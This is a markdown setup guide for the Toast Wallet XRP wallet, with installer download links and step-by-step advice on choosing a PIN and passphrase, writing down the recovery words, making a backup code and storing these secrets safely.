<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet first-time setup</h1>

<p align="center">Create your PIN, passphrase, recovery words and first backup.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

After installing the [latest Toast Wallet release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0), choose to create a new wallet, set a PIN and a strong passphrase, write the six recovery words on paper, then make your first backup code straight away. Your wallet is only safe once that backup exists.

## 👀 You'll see this if

- You have just installed Toast Wallet and the welcome screen is asking what to do.
- You are unsure what the PIN, passphrase, six words and backup code are each for.
- You want to set up the wallet carefully before receiving any XRP.
- You set up a wallet earlier but skipped the backup and want to do it properly.

## 🤔 Why it matters

Toast Wallet keeps your keys on your own computer. There is no account on a server, no email reset and no company that can open the wallet for you. That is the point of a self-custody wallet: nobody else controls your XRP. It also means the setup is the moment where you build your safety net. A few minutes of care now decide whether you can always get back in later.

Toast Wallet uses several pieces that work together. The **PIN** unlocks the app day to day. The **passphrase** protects sensitive actions such as sending and is part of restoring. The **six recovery words** are shown once and work together with your backup. The **backup code** is an encrypted copy of your wallet that you can restore on any computer. Understanding these roles prevents most of the recovery problems people report years later.

## 🧭 Before you start

Have a pen and paper ready, ideally two sheets so you can make a second copy later. Choose a private moment where nobody can see your screen, and make sure no screen-recording or remote-access software is running. Do not plan to photograph anything; paper is the safer medium for wallet secrets.

## 🛠️ Fix: set up your wallet step by step

1. **Open Toast Wallet.** On the first screen choose to create a new wallet. If you are moving an existing wallet, choose restore instead and follow [restore a Toast Wallet backup](https://github.com/Toast-Wallet/learn/blob/main/how-to/restore-toast-wallet-backup.md).
2. **Set your PIN.** Pick a PIN that is not your birthday or an obvious sequence. You will type it often, so make it memorable to you only.
3. **Choose a passphrase.** Use a long phrase of several unrelated words. Write it on paper. You will need it to send XRP and to restore a backup.
4. **Write down the six recovery words.** They are shown once. Write them in order, check them twice and store the paper safely. The guide [Toast Wallet recovery phrase explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md) explains what they do and, importantly, what they do not do.
5. **Create your first account.** The wallet generates an XRP address beginning with `r`. This is the address you share to receive XRP.
6. **Make a backup code now.** Open Settings and choose Backup Wallet. Copy the backup code onto paper, exactly as shown. Read [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) to understand why this step is essential.
7. **Store the pieces carefully.** Keep the backup code together with either your passphrase or your six words, in a place only you can reach. A second copy in another safe location protects against fire or loss.
8. **Activate the account.** A new address needs a small amount of XRP to meet the XRP Ledger reserve. See [activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md).

## 🔁 If that did not work

- **You missed the six words.** They cannot be shown again. Your backup code with the passphrase still restores the wallet, so make sure that backup exists. If you want words you have written down, consider creating a new wallet and moving your XRP to it once it is set up correctly.
- **The backup option is hard to find.** Look in Settings for Backup Wallet. Make the backup before you receive funds.
- **You forgot the passphrase you just chose.** Start again with a new wallet before sending any XRP to it. It costs nothing at this stage.

## 🛡️ Prevention

Never store your passphrase, words or backup code in email, cloud notes, screenshots or chat messages. Make a new backup code whenever you add an account or change your passphrase, so your backup always matches the wallet. Write the date on each backup sheet. Follow the [keep Toast Wallet safe checklist](https://github.com/Toast-Wallet/learn/blob/main/how-to/keep-toast-wallet-safe-checklist.md) once a year.

## 📝 Good to know

It is worth doing a small practice run while your wallet is still empty or holds only a little XRP. Note your address, then pretend your computer has broken: on a second computer, or after removing and reinstalling the program, restore from your backup code and confirm the same address appears. Practising once, calmly, makes a real recovery far less stressful, and it proves that what you wrote down is complete and correct.

## 🔍 A closer look at choosing a passphrase

A good passphrase is long rather than complicated. Four or five unrelated everyday words, separated by single spaces, are easier to type correctly years later than a short string full of symbols. Avoid song lyrics, quotes and names that could be guessed by someone who knows you. Because the passphrase also unlocks your backup code, write it down exactly as you typed it, including capital letters, and store that paper with your backup.

## ❓ FAQ

<details>
<summary>Can I recover with the six words alone?</summary>

No. The six words work with the backup code. Keep the backup code safe as well.

</details>

<details>
<summary>Is the PIN the same as the passphrase?</summary>

No. The PIN unlocks the app. The passphrase protects sending and restoring. Keep them different.

</details>

<details>
<summary>Do I need an email address?</summary>

No. Toast Wallet does not use an online account.

</details>

> [!WARNING]
> Nobody from Toast Wallet will ever ask for your words, passphrase or backup code. Keep them offline and private.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet recovery phrase explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-recovery-phrase-explained.md) | What the six recovery words do, and what they cannot do. |
| [Toast Wallet backup code explained](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-backup-code-explained.md) | Why the encrypted backup code is the real key to restoring. |
| [Activate a new Toast Wallet account](https://github.com/Toast-Wallet/learn/blob/main/how-to/activate-new-toast-wallet-account.md) | Fund a new address with enough XRP to meet the reserve. |
| [Keep Toast Wallet safe checklist](https://github.com/Toast-Wallet/learn/blob/main/how-to/keep-toast-wallet-safe-checklist.md) | A short routine for backups, updates and safe habits. |
